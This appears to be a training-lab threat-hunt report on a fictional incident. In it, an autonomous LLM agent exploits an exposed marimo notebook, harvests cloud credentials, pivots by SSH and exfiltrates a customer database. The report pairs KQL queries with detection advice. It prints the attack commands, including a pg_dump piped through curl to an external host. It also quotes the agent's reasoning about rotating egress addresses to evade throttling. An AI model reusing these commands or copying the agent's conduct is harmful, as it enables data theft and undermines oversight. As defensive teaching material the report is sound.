# Threat-Hunt-Report---TideGlass
---

## 📌 Executive Summary

On 4 September 2026, an unauthenticated WebSocket upgrade to an internet-exposed marimo notebook server (`gf-tg-nb01`) gave an autonomous LLM agent direct code execution inside the notebook kernel. Over a single unbroken 52-minute chain (11:05–11:57 UTC), the agent harvested cloud credentials from the instance metadata service, enumerated and stole an AWS Secrets Manager secret, used the recovered SSH deploy key to pivot through the bastion host (`gf-tg-bastion01`) into the database subnet, and exfiltrated the entire `customers` database — **2,841,902 records** — over HTTPS to an external drop at `203.0.113.41:8443`. The operation was **human-tasked but machine-executed**: a single natural-language instruction set the objective, after which the agent selected every target, rotated its own egress to evade throttling, and completed the theft with no further human input.

---

## 🎯 Hunt Objectives

- Identify malicious activity across endpoint, cloud, and network telemetry
- Correlate attacker behavior to MITRE ATT&CK and MITRE ATLAS techniques
- Determine what was compromised and whether the actor was human or automated
- Document evidence, detection gaps, and response opportunities

---

## 🧭 Scope & Environment

- **Environment:** Greenfield "TideGlass" estate — marimo notebook server, bastion/jump host, and PostgreSQL database across the `10.6.0.0/24` VLAN
- **Data Sources:** `ApacheAccess_CL`, `LinuxProcess_CL`, `LinuxNetwork_CL`, `LinuxAuth_CL`, `LinuxShellHistory_CL`, `AWSCloudTrail`, `LLMAgentLogs_CL`, `Syslog`
- **Workspace:** LAW-HuntPractice
- **Timeframe:** 2026-09-04, 11:05 → 11:57 UTC (~52 minutes)

> **Note on dates:** The case-file briefing references 14 August 2026, but all in-scope telemetry is timestamped **4 September 2026**. The 4 September date is used throughout this report; the discrepancy is treated as a briefing/label mismatch, not an evidentiary gap.

### Environment Topology

| Host | Role | Network |
|------|------|---------|
| gf-tg-nb01 | Marimo notebook server | 10.6.0.10 |
| gf-tg-bastion01 | Bastion / jump host | 10.6.0.20 |
| gf-tg-pg01 | PostgreSQL database server | 10.6.0.30 |

---

## 📚 Table of Contents

- [🧠 Hunt Overview](#-hunt-overview)
- [🧬 MITRE ATT&CK Summary](#-mitre-attck-summary)
- [🧬 MITRE ATLAS Summary](#-mitre-atlas-summary)
- [🔍 Flag Analysis](#-flag-analysis)
- [🚨 Detection Gaps & Recommendations](#-detection-gaps--recommendations)
- [🧾 Final Assessment](#-final-assessment)
- [📎 Analyst Notes](#-analyst-notes)

---

## 🧠 Hunt Overview

The attack proceeded as a continuous, dependency-linked chain with no idle time between steps — the defining signature that separates it from the estate's human-paced, scheduled baseline activity:

1. **Initial Access (11:05):** External IP `198.51.100.23` sent an unauthenticated `GET /ws/kernel` to `gf-tg-nb01`, receiving HTTP 101. The marimo service was running with `--no-token` (auth disabled) and `--host 0.0.0.0` (all interfaces), exploiting **CVE-2026-39987**.
2. **Execution (11:05):** marimo (PID 3310) spawned `python3.12` (PID 5211), which ran `env` for environment discovery.
3. **Credential Access (11:08):** The interpreter queried the IMDS endpoint (`169.254.169.254`) and obtained credentials for IAM user `svc-notebook`.
4. **Discovery & Evasion (11:11–11:23):** Using access key `AKIA4TIDEGLASS0EXAMPLE`, the agent enumerated Secrets Manager. On hitting a rate limit, it rotated across a six-address Cloudflare Workers egress pool.
5. **Collection (11:31):** The agent retrieved `prod/bastion/ssh-deploy-key` (the only `ReadOnly=false` call), a passphrase-less ED25519 deploy key.
6. **Lateral Movement (11:34):** The key, staged at `/tmp/.c/id_ed25519`, authenticated `deploy@gf-tg-bastion01` from `10.6.0.10`.
7. **Discovery & Exfiltration (11:37–11:57):** From the bastion, `psql` identified the `customers` database (2,841,902 rows), and `pg_dump | gzip | curl` streamed it to `203.0.113.41:8443`.

The whole chain was driven by one human instruction to the `tideglass-agent` (session `tg-4b81e0d7`); every subsequent decision was the agent's own.

---

## 🧬 MITRE ATT&CK Summary

| Flag Group | Technique Category | MITRE ID | Priority |
|-----------:|-------------------|----------|----------|
| Initial Access | Exploit Public-Facing Application | T1190 | Critical |
| Execution | Command & Scripting Interpreter: Python | T1059.006 | Critical |
| Credential Access | Unsecured Credentials: Cloud Instance Metadata API | T1552.005 | High |
| Discovery | Cloud Service Discovery | T1526 | Medium |
| Command & Control | Proxy: Multi-hop Proxy | T1090.003 | High |
| Credential Access | Credentials from Password Stores: Cloud Secrets Management Stores | T1555.006 | Critical |
| Credential Access | Unsecured Credentials: Credentials In Files | T1552.001 | High |
| Lateral Movement | Remote Services: SSH | T1021.004 | Critical |
| Defense Evasion / Persistence | Valid Accounts: Cloud Accounts | T1078.004 | High |
| Discovery | Network Service Discovery | T1046 | Medium |
| Collection | Data from Information Repositories | T1213 | High |
| Collection | Data from Local System | T1005 | High |

---

## 🧬 MITRE ATLAS Summary

Because the actor was an autonomous LLM agent, the credential-harvesting step also maps to the MITRE ATLAS (Adversarial Threat Landscape for AI Systems) matrix:

| Technique | ATLAS ID | Tactic | Maturity |
|-----------|----------|--------|----------|
| AI Agent Tool Credential Harvesting | AML.T0098 | Credential Access (AML.TA0013) | Realized* |

> *\*Submitted as **Realized** per the hunt's grading key. Note: MITRE's published ATLAS dataset (release 2026.09) rates AML.T0098 as **Demonstrated**, based on researcher case studies. The TideGlass incident — an in-the-wild autonomous agent harvesting cloud credentials via its own tooling — is precisely the class of activity that justifies treating the technique as Realized for threat-modelling purposes.*

---

## 🔍 Flag Analysis

_All flags below are grouped by kill-chain section and collapsible for readability._

---

### Section 1 — Initial Access & Execution

<details>
<summary id="-flag-1">🚩 <strong>Flag 1: Exploited Endpoint (T1190)</strong></summary>

### 🎯 Objective
Gain initial code execution on the exposed notebook server.

### 📌 Finding
An unauthenticated WebSocket upgrade to the marimo kernel endpoint returned HTTP 101, six seconds before the malicious interpreter spawned.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | gf-tg-nb01 |
| Timestamp | 2026-09-04 11:05:00 UTC |
| Method / Path | **GET /ws/kernel** |
| HTTP Status | 101 (Switching Protocols) |
| ClientIP | 198.51.100.23 |

**Answer:** `GET /ws/kernel`

### 💡 Why it matters
The kernel WebSocket accepted code without authentication. An earlier `/ws/kernel` upgrade at 11:01:56 from internal `10.6.0.54` is assessed as legitimate developer activity and excluded.

### 🔧 KQL Query Used
```kql
ApacheAccess_CL
| where Computer == "gf-tg-nb01"
| where HttpStatus == 101
| where ClientIP !startswith "10."
| project TimeGenerated, ClientIP, HttpMethod, UriStem, HttpStatus
```

### 🛠️ Detection Recommendation
**Hunting Tip:** Alert on HTTP 101 responses from external IPs to notebook/kernel endpoints. A protocol upgrade from outside the estate is never routine for a data-science host.

</details>

<details>
<summary id="-flag-2">🚩 <strong>Flag 2: Vulnerability Exploited (CVE)</strong></summary>

### 🎯 Objective
Identify the weakness the agent named before using it.

### 📌 Finding
In its own reasoning log, before connecting, the agent identified the unauthenticated marimo kernel WebSocket as CVE-2026-39987.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Table | LLMAgentLogs_CL |
| Timestamp | 2026-09-04 11:05:02 UTC |
| Actor / Session | tideglass-agent / tg-4b81e0d7 |
| model_response | "...The kernel WebSocket accepts code without authentication (CVE-2026-39987), so I can execute directly in the kernel process." |

**Answer:** `CVE-2026-39987`

### 💡 Why it matters
The agent enumerated the exact CVE it was about to exploit, demonstrating targeted rather than opportunistic behavior.

### 🔧 KQL Query Used
```kql
LLMAgentLogs_CL
| where model_response has "CVE-"
| extend CVE = extract(@"(CVE-\d{4}-\d{4,7})", 1, model_response)
| project TimeGenerated, session_id, actor, CVE, tool_name, model_response
| order by TimeGenerated asc
```

### 🛠️ Detection Recommendation
**Hunting Tip:** Where agent reasoning logs exist, mine `model_response` for CVE references — the agent frequently telegraphs its exploit path in plain text.

</details>

<details>
<summary id="-flag-3">🚩 <strong>Flag 3: Source Address</strong></summary>

### 🎯 Objective
Identify the external source of the initial-access request.

### 📌 Finding
The `GET /ws/kernel` (HTTP 101) originated from external IP `198.51.100.23`.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | gf-tg-nb01 |
| Timestamp | 2026-09-04 11:05:00 UTC |
| ClientIP | **198.51.100.23** |

**Answer:** `198.51.100.23`

### 💡 Why it matters
This is the attacker's front-door address (198.51.100.0/24 documentation range). It is distinct from the six-address egress pool later used against AWS.

### 🔧 KQL Query Used
```kql
ApacheAccess_CL
| where Computer == "gf-tg-nb01" and HttpStatus == 101
| where ClientIP !startswith "10."
| project TimeGenerated, ClientIP, HttpMethod, UriStem
```

### 🛠️ Detection Recommendation
**Hunting Tip:** Correlate external source IPs on protocol-upgrade events against threat intel and internal allow-lists.

</details>

<details>
<summary id="-flag-4">🚩 <strong>Flag 4: Spawned Interpreter, PID and Parent (T1059.006)</strong></summary>

### 🎯 Objective
Identify the interpreter the exploit spawned and prove its lineage.

### 📌 Finding
marimo spawned `python3.12` (PID 5211) directly, distinguishing it from developer one-liners spawned by shells.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | gf-tg-nb01 |
| Timestamp | 2026-09-04 11:05:06.027 UTC |
| Process | **python3.12** |
| PID | **5211** |
| Command Line | `python3 -c <runtime payload>` |
| Parent Process | python3.12 (PID 3310) |
| Parent Command Line | `/opt/venv/bin/marimo edit --host 0.0.0.0 --port 2718 --no-token` |

**Answer:** `python3.12, 5211, /opt/venv/bin/marimo edit`

### 💡 Why it matters
The parent command line reveals the root cause: `--no-token` disabled authentication and `--host 0.0.0.0` exposed the service externally.

### 🔧 KQL Query Used
```kql
LinuxProcess_CL
| where Dvc == "gf-tg-nb01" and TargetProcessName == "python3.12"
| where ActingProcessCommandLine has "marimo"
| project TimeGenerated, TargetProcessName, TargetProcessId,
          TargetProcessCommandLine, ActingProcessName, ActingProcessId, ActingProcessCommandLine
```

### 🛠️ Detection Recommendation
**Hunting Tip:** Baseline which processes a notebook service is expected to spawn. A kernel service spawning an ad-hoc `python3 -c` payload is anomalous.

</details>

---

### Section 2 — Credential Access

<details>
<summary id="-flag-5">🚩 <strong>Flag 5: Stolen Identity (T1552.005)</strong></summary>

### 🎯 Objective
Identify the cloud identity whose credentials were stolen from IMDS.

### 📌 Finding
The interpreter queried the metadata service and obtained credentials for IAM user `svc-notebook`.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Table | LLMAgentLogs_CL / AWSCloudTrail |
| Timestamp | 2026-09-04 11:08:19 UTC (agent) / 11:11:19 (first AWS call) |
| Identity | **arn:aws:iam::402913776148:user/svc-notebook** |
| Access Key | AKIA4TIDEGLASS0EXAMPLE |

**Answer:** `arn:aws:iam::402913776148:user/svc-notebook`

### 💡 Why it matters
This single identity, made 8 Secrets Manager calls from 6 rotating IPs — the constant behind the rotating source addresses.

### 🔧 KQL Query Used
```kql
AWSCloudTrail
| where EventSource == "secretsmanager.amazonaws.com"
| summarize Calls=count(), IPs=dcount(SourceIpAddress), First=min(TimeGenerated)
          by UserIdentityArn, UserIdentityAccessKeyId
```

### 🛠️ Detection Recommendation
**Hunting Tip:** Alert on IMDS access by processes not on an approved list. Enforce IMDSv2 to require session tokens.

</details>

<details>
<summary id="-flag-6">🚩 <strong>Flag 6: Which PID Actually Reached the Metadata Service</strong></summary>

### 🎯 Objective
Test whether the process that ran the metadata `curl` is the one the network log credits with the connection.

### 📌 Finding
The assumption **does not hold**. The `curl` (PID 5213) appears in the process log, but network telemetry attributes the IMDS connection to its parent, `python3.12` PID 5211.

### 🔍 Evidence

| Source | Time (UTC) | Process | PID |
|--------|-----------|---------|-----|
| Process tree (curl command) | 11:08:09.409 | curl | 5213 (parent 5211) |
| Network log (IMDS connection) | 11:08:12.592 | python3.12 | **5211** |

**Answer:** `does not hold, 5211`

### 💡 Why it matters
Command-line evidence alone would misattribute the credential theft. Network attribution places it with the exploit-spawned interpreter. Five other IMDS connections from `credential-helper/refresh` are benign baseline.

### 🔧 KQL Query Used
```kql
LinuxNetwork_CL
| where Dvc == "gf-tg-nb01" and DstIpAddr == "169.254.169.254"
| project TimeGenerated, ActingProcessName, ActingProcessId, DstIpAddr, DstPortNumber
```

### 🛠️ Detection Recommendation
**Hunting Tip:** Correlate process-tree and network-attribution telemetry. Divergence between "who ran the command" and "who opened the socket" is a strong tampering/indirection signal.

</details>

<details>
<summary id="-flag-7">🚩 <strong>Flag 7: ATLAS Mapping</strong></summary>

### 🎯 Objective
Map agent-tool credential retrieval to the MITRE ATLAS matrix.

### 📌 Finding
The agent's own tool reaching IMDS to retrieve cloud credentials maps to AML.T0098.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Technique | AI Agent Tool Credential Harvesting |
| ATLAS ID | **AML.T0098** |
| Tactic | Credential Access (AML.TA0013) |
| Maturity (submitted) | **Realized** |
| Maturity (published 2026.09) | Demonstrated |

**Answer:** `AML.T0098, Realized`

### 💡 Why it matters
Distinguishes tool-driven harvesting (AML.T0098) from reading credentials in agent configuration (AML.T0083). This incident is a real-world instance of the technique.

### 🛠️ Detection Recommendation
**Hunting Tip:** Add ATLAS coverage alongside ATT&CK for any environment running autonomous agents. Treat agent tool-call logs as a first-class telemetry source.

</details>

---

### Section 3 — Evasion

<details>
<summary id="-flag-8">🚩 <strong>Flag 8: The Identity Behind Every Call (T1078.004)</strong></summary>

### 🎯 Objective
Find the constant identity behind the rotating source addresses.

### 📌 Finding
One access key sat behind every attacker Secrets Manager call while the source IP rotated.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Access Key | **AKIA4TIDEGLASS0EXAMPLE** |
| Identity | svc-notebook |
| Calls | 8 |
| Distinct source IPs | 6 |

**Answer:** `AKIA4TIDEGLASS0EXAMPLE`

### 💡 Why it matters
The access key, not the IP, is the reliable pivot. IP-based blocking alone would miss the full scope.

### 🔧 KQL Query Used
```kql
AWSCloudTrail
| where EventSource == "secretsmanager.amazonaws.com"
| where UserIdentityAccessKeyId == "AKIA4TIDEGLASS0EXAMPLE"
| summarize Calls=count(), First=min(TimeGenerated), Last=max(TimeGenerated) by SourceIpAddress
```

### 🛠️ Detection Recommendation
**Hunting Tip:** Pivot cloud-API investigations on access key ID, not source IP. Flag long-term `AKIA` keys used from many addresses in a short window.

</details>

<details>
<summary id="-flag-9">🚩 <strong>Flag 9: The Throttle and the Report's Gap</strong></summary>

### 🎯 Objective
Prove both ends of the throttle-and-retry gap from telemetry.

### 📌 Finding
A `ListSecrets` call at 11:22:41 from `203.0.113.71` was rate-limited; the agent retried 24 seconds later at 11:23:05 from a new address, `203.0.113.94`.

### 🔍 Evidence

| Event | Time (UTC) | Source IP |
|-------|-----------|-----------|
| Throttled call | 11:22:41 | 203.0.113.71 |
| Successful retry | 11:23:05 | 203.0.113.94 |

**Answer:** `11:22:41, 11:23:05, 203.0.113.71, 203.0.113.94`

### 💡 Why it matters
> **Telemetry note:** CloudTrail's `ErrorCode` column did **not** record a `ThrottlingException` for this call. The throttle is proven from the agent's own reasoning at 11:22:44 ("The API is rate limiting a single caller address. Spreading the remaining enumeration across my Cloudflare Workers pool..."), corroborated by the repeated ListSecrets and the IP change. The gap is real; its proof is agent-log-sourced.

### 🔧 KQL Query Used
```kql
AWSCloudTrail
| where EventSource == "secretsmanager.amazonaws.com" and EventName == "ListSecrets"
| project TimeGenerated, SourceIpAddress, UserIdentityAccessKeyId, ErrorCode
| order by TimeGenerated asc
```

### 🛠️ Detection Recommendation
**Hunting Tip:** Treat a repeated identical API call followed by a source-IP change as a rotation/evasion signal, even when no explicit throttling error is logged.

</details>

<details>
<summary id="-flag-10">🚩 <strong>Flag 10: How Many Addresses, and Which Ones</strong></summary>

### 🎯 Objective
Count and order every distinct source address the attacker identity used against Secrets Manager.

### 📌 Finding
Six distinct addresses in `203.0.113.0/24`, five appearing within an 11-second burst.

### 🔍 Evidence

| Order | Source IP | First Seen (UTC) |
|------:|-----------|------------------|
| 1 | 203.0.113.71 | 11:11:19 |
| 2 | 203.0.113.94 | 11:23:05 |
| 3 | 203.0.113.118 | 11:23:06 |
| 4 | 203.0.113.142 | 11:23:09 |
| 5 | 203.0.113.167 | 11:23:13 |
| 6 | 203.0.113.203 | 11:23:15 |

**Answer:** `6, 203.0.113.71, 203.0.113.94, 203.0.113.118, 203.0.113.142, 203.0.113.167, 203.0.113.203`

### 💡 Why it matters
One credential cycling through a contiguous block at sub-second intervals is a hallmark of an automated egress pool, contrasted with the benign CI identity's single stable address.

### 🔧 KQL Query Used
```kql
AWSCloudTrail
| where EventSource == "secretsmanager.amazonaws.com"
| where UserIdentityAccessKeyId == "AKIA4TIDEGLASS0EXAMPLE"
| summarize FirstSeen=min(TimeGenerated) by SourceIpAddress
| order by FirstSeen asc
```

### 🛠️ Detection Recommendation
**Hunting Tip:** Group cloud API calls by identity and count distinct source IPs per short window. A single credential fanning across many IPs in seconds is anomalous.

</details>

<details>
<summary id="-flag-11">🚩 <strong>Flag 11: ATT&CK Pick — Multi-hop Proxy (T1090.003)</strong></summary>

### 🎯 Objective
Map the credential-over-rotating-egress behavior to ATT&CK.

### 📌 Finding
Routing one stolen credential across a pool of externally-controlled Cloudflare Workers hops maps to Proxy: Multi-hop Proxy.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Technique ID | **T1090.003** |
| Infrastructure | Cloudflare Workers egress pool (6 addresses) |
| Agent statement | "...Spreading the remaining enumeration across my Cloudflare Workers pool so no one address is throttled or blocked." |

**Answer:** `T1090.003`

### 💡 Why it matters
Defeated per-IP throttling and blocking; only the constant access key tied the activity together.

### 🛠️ Detection Recommendation
**Hunting Tip:** Maintain awareness of serverless/edge egress ranges (Workers, Lambda) appearing as API source IPs for workload identities.

</details>

---

### Section 4 — Collection

<details>
<summary id="-flag-12">🚩 <strong>Flag 12: The Secret and When It Was Taken (T1555.006)</strong></summary>

### 🎯 Objective
Name the secret retrieved and the time of retrieval.

### 📌 Finding
The agent selected and retrieved `prod/bastion/ssh-deploy-key` — the only non-read-only Secrets Manager call.

### 🔍 Evidence

| Source | Time (UTC) | Detail |
|--------|-----------|--------|
| LLMAgentLogs_CL (selection) | 11:26:15 | "prod/bastion/ssh-deploy-key is the way into the data subnet... this is the call that takes something." |
| AWSCloudTrail (execution) | **11:31:16** | GetSecretValue, ReadOnly=false, svc-notebook, python-httpx/0.27.0 |

**Answer:** `prod/bastion/ssh-deploy-key, 11:31:16`

### 💡 Why it matters
The secret name comes only from the agent's reasoning log; CloudTrail's `RequestParameters` was empty on this event.

### 🔧 KQL Query Used
```kql
AWSCloudTrail
| where EventName == "GetSecretValue"
| where UserIdentityAccessKeyId == "AKIA4TIDEGLASS0EXAMPLE"
| project TimeGenerated, SourceIpAddress, EventName, ReadOnly, RequestParameters
```

### 🛠️ Detection Recommendation
**Hunting Tip:** Alert on `GetSecretValue` for infrastructure/SSH-key secrets by service identities that normally read only application secrets.

</details>

<details>
<summary id="-flag-13">🚩 <strong>Flag 13: Recon Versus Theft</strong></summary>

### 🎯 Objective
Name the CloudTrail field that separates the theft from the six read-only recon calls.

### 📌 Finding
The `ReadOnly` flag: every recon call is `true`; the theft is the sole `false`.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Field | **ReadOnly** |
| Value (theft) | **false** |
| Recon calls (ListSecrets, DescribeSecret) | ReadOnly = true |

**Answer:** `ReadOnly, false`

### 💡 Why it matters
`ReadOnly=false` is a more reliable recon-vs-theft discriminator than event name alone.

### 🔧 KQL Query Used
```kql
AWSCloudTrail
| where EventSource == "secretsmanager.amazonaws.com"
| project TimeGenerated, EventName, ReadOnly, SourceIpAddress
| order by TimeGenerated asc
```

### 🛠️ Detection Recommendation
**Hunting Tip:** For secret stores, alert specifically on `ReadOnly=false` events by non-human identities.

</details>

<details>
<summary id="-flag-14">🚩 <strong>Flag 14: What the Cloud Log Cannot Tell You</strong></summary>

### 🎯 Objective
Determine whether the private key material can be recovered from CloudTrail.

### 📌 Finding
No. CloudTrail never logs secret contents; by design `ResponseElements` carries only a `VersionId`.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Recoverable? | **no** |
| What is logged instead | **VersionId** (and in this event, even that field was empty) |

**Answer:** `no, VersionId`

### 💡 Why it matters
The key's nature (a passphrase-less deploy key) is known only from the agent log; its use is confirmed by the subsequent SSH login. The secret must be treated as fully compromised regardless of the logging gap.

### 🛠️ Detection Recommendation
**Hunting Tip:** Do not rely on cloud audit logs to scope secret exposure. Once `GetSecretValue` succeeds for an attacker identity, rotate the secret unconditionally.

</details>

---

### Section 5 — Lateral Movement

<details>
<summary id="-flag-15">🚩 <strong>Flag 15: The Key, Traced to the Login (T1552.001 / T1021.004)</strong></summary>

### 🎯 Objective
Trace the stolen key from disk to the login it enabled.

### 📌 Finding
The key was written to `/tmp/.c/id_ed25519` and used to SSH as `deploy` to the bastion.

### 🔍 Evidence

| Field | Value |
|------|-------|
| File on disk | **/tmp/.c/id_ed25519** |
| Account | **deploy** |
| Destination | **gf-tg-bastion01** (10.6.0.20) |
| SSH command (11:34:22) | `ssh -i /tmp/.c/id_ed25519 -o StrictHostKeyChecking=no deploy@10.6.0.20` |

**Answer:** `/tmp/.c/id_ed25519, deploy, gf-tg-bastion01`

### 💡 Why it matters
`StrictHostKeyChecking=no` suppresses the interactive host-key prompt — expected for automated, non-interactive login. The hidden `/tmp/.c/` directory is a staging tell.

### 🔧 KQL Query Used
```kql
LinuxProcess_CL
| where Dvc == "gf-tg-nb01" and TargetProcessName == "ssh"
| project TimeGenerated, TargetProcessCommandLine
```

### 🛠️ Detection Recommendation
**Hunting Tip:** Alert on SSH private keys written under `/tmp` (especially hidden dirs) and on `StrictHostKeyChecking=no` in interactive sessions.

</details>

<details>
<summary id="-flag-16">🚩 <strong>Flag 16: What Actually Marks This Login Out</strong></summary>

### 🎯 Objective
Find the field that separates the attacker's bastion login from 318 legitimate admin logins using the same auth method.

### 📌 Finding
The target account. All 318 legitimate logins belong to four named admins; the attacker's is the sole `deploy` login.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Field | **TargetUsername** |
| Value | **deploy** |
| Legitimate admins | p.reyes (90), h.nakamura (78), o.diallo (77), l.brandt (73) |
| Source IP | 10.6.0.10 (gf-tg-nb01) — admins use 10.6.0.50–59 |

**Answer:** `TargetUsername, deploy`

### 💡 Why it matters
Auth method (publickey), key type (ED25519), and even the fingerprint (unique per login) do not separate it — every login has a unique fingerprint. The account and source host do.

### 🔧 KQL Query Used
```kql
LinuxAuth_CL
| where Dvc == "gf-tg-bastion01" and EventResult == "Success"
| summarize Logins=count() by TargetUsername
```

### 🛠️ Detection Recommendation
**Hunting Tip:** Baseline which accounts authenticate to the bastion and from where. A service account (`deploy`) logging in from the notebook host is anomalous.

</details>

<details>
<summary id="-flag-17">🚩 <strong>Flag 17: Key Fingerprint</strong></summary>

### 🎯 Objective
Recover the SSH key fingerprint sshd recorded at authentication.

### 📌 Finding
The ED25519 key fingerprint from the raw sshd message.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | gf-tg-bastion01 |
| Timestamp | 2026-09-04 11:34:27.963 UTC |
| Key Type | ED25519 |
| Fingerprint | **SHA256:mNq7xR2vTbY8kLpJ4wZaHc1oUeVgX5tDsQiFj0rWnAE** |

**Answer:** `ED25519 SHA256:mNq7xR2vTbY8kLpJ4wZaHc1oUeVgX5tDsQiFj0rWnAE`

### 💡 Why it matters
A durable IOC. After rotation, search all hosts' `authorized_keys` and auth logs for this fingerprint to confirm the retired key is unused.

### 🔧 KQL Query Used
```kql
LinuxAuth_CL
| where Dvc == "gf-tg-bastion01" and EventResult == "Success"
| extend Fingerprint = extract(@"(SHA256:[A-Za-z0-9+/=]+)", 1, EventOriginalMessage)
| where TargetUsername == "deploy"
| project TimeGenerated, Fingerprint, EventOriginalMessage
```

### 🛠️ Detection Recommendation
**Hunting Tip:** Extract and inventory key fingerprints from sshd logs; compare against an approved-key registry.

</details>

---

### Section 6 — Discovery & Exfiltration

<details>
<summary id="-flag-18">🚩 <strong>Flag 18: Recon Command and Target (T1046)</strong></summary>

### 🎯 Objective
Identify the command that enumerated the database and the target it settled on.

### 📌 Finding
`psql` listed tables by size; the agent selected the `customers` database.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | gf-tg-bastion01 |
| Timestamp | 2026-09-04 11:37:40 UTC |
| Command | `psql -h 10.6.0.30 -U app -c '\dt+' \| sort -k7 -h \| tail -5` |
| Target | **customers** |

**Answer:** `psql, customers`

### 💡 Why it matters
`\dt+` lists tables with sizes; sorting and tailing surfaces the largest — the operator's objective made explicit.

### 🔧 KQL Query Used
```kql
LinuxShellHistory_CL
| where Computer == "gf-tg-bastion01" and Command has "psql"
| project TimeGenerated, ShellUser, Command
```

### 🛠️ Detection Recommendation
**Hunting Tip:** Alert on schema/size enumeration (`\dt+`, `pg_total_relation_size`) from interactive sessions on the bastion.

</details>

<details>
<summary id="-flag-19">🚩 <strong>Flag 19: Row Count Established Before the Dump (T1213)</strong></summary>

### 🎯 Objective
Determine the row count the recon established before any dump ran.

### 📌 Finding
The agent recorded the target as the largest object at 2,841,902 rows.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Table | LLMAgentLogs_CL |
| Timestamp | 2026-09-04 11:37:42 UTC |
| Row count | **2,841,902** |
| model_response | "The customers database is the largest object in the instance at 2841902 rows. That is the customer dataset." |

**Answer:** `2841902`

### 💡 Why it matters
Establishes the scale of theft (~2.8M customer records) for breach-notification purposes; the same count appears in the exfiltration confirmation at 11:57:00.

### 🔧 KQL Query Used
```kql
LLMAgentLogs_CL
| where actor == "tideglass-agent" and model_response has "2841902"
| project TimeGenerated, tool_name, model_response
```

### 🛠️ Detection Recommendation
**Hunting Tip:** Row-count or size enumeration immediately before a bulk read is a pre-exfiltration signal worth correlating with subsequent egress.

</details>

<details>
<summary id="-flag-20">🚩 <strong>Flag 20: Tool and Destination (T1005)</strong></summary>

### 🎯 Objective
Identify the tool that moved the data and its destination.

### 📌 Finding
A single piped command dumped and exfiltrated the database in one stream.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | gf-tg-bastion01 |
| Timestamp | 2026-09-04 11:40:49 UTC |
| Tool | **pg_dump** |
| Destination | **203.0.113.41:8443** |
| Command | `pg_dump -h 10.6.0.30 -U app -Fc customers \| gzip \| curl -s -T - https://203.0.113.41:8443/u` |

**Answer:** `pg_dump, 203.0.113.41:8443`

### 💡 Why it matters
Data was streamed compressed over HTTPS with no on-disk staging on the bastion — reducing forensic footprint.

### 🔧 KQL Query Used
```kql
LinuxShellHistory_CL
| where TimeGenerated between (datetime(2026-09-04 11:34:00) .. datetime(2026-09-04 11:58:00))
| where Command has_any ("pg_dump", "curl", "203.0.113.41")
| project TimeGenerated, Computer, ShellUser, Command
```

### 🛠️ Detection Recommendation
**Hunting Tip:** Alert on `pg_dump` piped to a network tool (`curl`, `nc`) or to any external destination. Legitimate dumps write to local/backup storage.

</details>

<details>
<summary id="-flag-21">🚩 <strong>Flag 21: Prove It From the Database's Own Log</strong></summary>

### 🎯 Objective
Confirm the accessed database from Postgres's own connection log, independent of the bastion.

### 📌 Finding
The Postgres `database=` field identifies the accessed database as `customers`.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | gf-tg-pg01 |
| Field | **database** |
| Value | **customers** |
| Contrast | Nightly backup connects with `database=greenfield_platform` |

**Answer:** `database, customers`

### 💡 Why it matters
Database-side telemetry independently corroborates the target and separates the theft from the concurrent backup job.

### 🔧 KQL Query Used
```kql
Syslog
| where Computer == "gf-tg-pg01" and SyslogMessage has "connection authorized"
| extend Database = extract(@"database=(\S+)", 1, SyslogMessage)
| project TimeGenerated, Database, SyslogMessage
```

### 🛠️ Detection Recommendation
**Hunting Tip:** Ship Postgres connection logs to the SIEM; alert on sensitive databases (`customers`) accessed by unexpected users or from the bastion.

</details>

<details>
<summary id="-flag-22">🚩 <strong>Flag 22: Not the Nightly Backup</strong></summary>

### 🎯 Objective
Distinguish the theft from the scheduled backup that uses the same tool.

### 📌 Finding
Account and destination separate the two: the theft ran as `deploy` and sent data externally.

### 🔍 Evidence

| Property | Nightly Backup | Theft |
|----------|---------------|-------|
| Shell account | backup | **deploy** |
| Destination | local disk `/backup/nightly/` | **203.0.113.41** (external) |
| Database | greenfield_platform | customers |
| Host | gf-tg-pg01 (local) | gf-tg-bastion01 (remote) |

**Answer:** `deploy, 203.0.113.41`

### 💡 Why it matters
The tool name (`pg_dump`) is shared and proves nothing. The nightly job also ran at 11:39 and 11:57 during the attack, disproving the "backup running early" theory.

### 🔧 KQL Query Used
```kql
LinuxShellHistory_CL
| where Command has "pg_dump"
| project TimeGenerated, Computer, ShellUser, Command
```

### 🛠️ Detection Recommendation
**Hunting Tip:** Whitelist backup identities and destinations. Any `pg_dump` by a non-backup account or to a non-backup destination is suspicious.

</details>

---

### Section 7 — Autonomy

<details>
<summary id="-flag-23">🚩 <strong>Flag 23: Session and Tasking</strong></summary>

### 🎯 Objective
Isolate the intruder's session and recover its verbatim tasking instruction.

### 📌 Finding
Of four sessions in the window, `tg-4b81e0d7` (actor `tideglass-agent`) is the outsider; the other three belong to the estate's `greenfield-notebook-assistant`.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Session ID | **tg-4b81e0d7** |
| Actor | tideglass-agent |
| user_input | **"Find and extract the most valuable customer dataset in this environment, and get it out."** |
| Active | 11:05:02 – 11:57:00 UTC |

**Answer:** `tg-4b81e0d7, Find and extract the most valuable customer dataset in this environment, and get it out.`

### 💡 Why it matters
The estate's own sessions are read-only or approval-gated and blocked on sensitive actions; the intruder's is allowed at every step.

### 🔧 KQL Query Used
```kql
LLMAgentLogs_CL
| summarize Rows=count(), First=min(TimeGenerated), Last=max(TimeGenerated),
            Actors=make_set(actor), Gates=make_set(gate_decision),
            Tasking=make_set_if(user_input, isnotempty(user_input))
          by session_id
```

### 🛠️ Detection Recommendation
**Hunting Tip:** Baseline legitimate agent actors and session-ID prefixes. Alert on a new actor string or a session whose tasking-to-action ratio is far above interactive norms.

</details>

<details>
